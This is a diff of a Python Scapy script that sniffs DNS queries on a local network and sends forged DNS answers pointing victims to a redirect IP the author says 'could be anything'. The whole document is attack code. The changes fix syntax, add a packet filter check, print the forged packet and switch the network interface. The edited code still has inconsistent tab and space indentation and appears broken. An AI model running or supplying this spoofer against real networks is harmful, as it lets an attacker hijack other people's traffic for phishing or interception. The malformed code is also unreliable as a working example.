@@ -19,25 +19,29 @@
 from scapy.all import *
 
 ## DEFINING CONSTANT
-redirectedIP = "192.168.1.30" # my fedora host ip
+redirectedIP = "192.168.1.30" # my fedora host ip/COULD BE ANYTHING
 
 ## DEFINING CALLBACK FUNCTIONS
 	# EACH PACKET WILL GO THROUGH THE FILTER TEST, TRUE FOR MATCH, FALSE FOR UNMATCH
 
 def filterbuilder (pkt) :
-	if pkt.haslayer(DNSQR)
-		if pkt.haslayer(UDP)
-			pkt[UDP].dport = 53
-			print "FOUND A DNS REQUEST ON UDP PORT 53"
-			return True
-		elif pkt.haslayer(TCP)
-			pkt[TCP].dport = 53
-			print "FOUND A DNS REQUEST ON TCP PORT 53"
-			return True
-		else:	
-			print "ERROR OCCURED IN FILTER BUILDER, DNSQR PACKET DOESNT HAVE A CORRECT TRANSPORT PROTOCOL "	
-			return False
-
+    if IP in pkt:
+        if pkt.haslayer(DNSQR):
+            if pkt.haslayer(UDP):
+	        pkt[UDP].dport = 53
+		print "FOUND A DNS REQUEST ON UDP PORT 53"
+		return True
+            elif pkt.haslayer(TCP):
+	    	pkt[TCP].dport = 53
+		print "FOUND A DNS REQUEST ON TCP PORT 53"
+		return True
+    	    else:	
+		print "ERROR OCCURED IN FILTER BUILDER, DNSQR PACKET DOESNT HAVE A CORRECT TRANSPORT PROTOCOL "	
+            return False
+        else:
+            return False
+    else:
+        return False
 	
 	# EACH PACKET THAT PASSES THE FILTER WILL GO THROUGH THIS ONE FOR DNS SPOOFING
 def dnsSpoof (pkt):
@@ -54,13 +58,15 @@ def dnsSpoof (pkt):
 	# send the spoofed packet
 		send(spoofedPkt)
 		print "*"*60 + "SPOOFED PACKET HAS BEEN SET" + "*"*60
-	print "THIS PACKET IS NOT DNS QUESTION RECORD PACKET, BUT WAS SENT TO PORT 53 OF TARGET IP"
+                spoofedPkt.show()
+        else:
+            print "THIS PACKET IS NOT DNS QUESTION RECORD PACKET, BUT WAS SENT TO PORT 53 OF TARGET IP"
 
 ## USING THE SNIFF FUNCTION
 
 # remember dns is an application layer that uses udp (mainly) 
 # on port 53, hece the sniff filter at port 53, as the second arg
 # first arg is the interface we want to sniff from
-sniff(iface="eth0", lfilter=filterbuilder filter="udp", store=0, prn=dnsSpoof)
+sniff(iface="wlp0s20u9u2", lfilter=filterbuilder, filter="udp", store=0, prn=dnsSpoof)
 
 
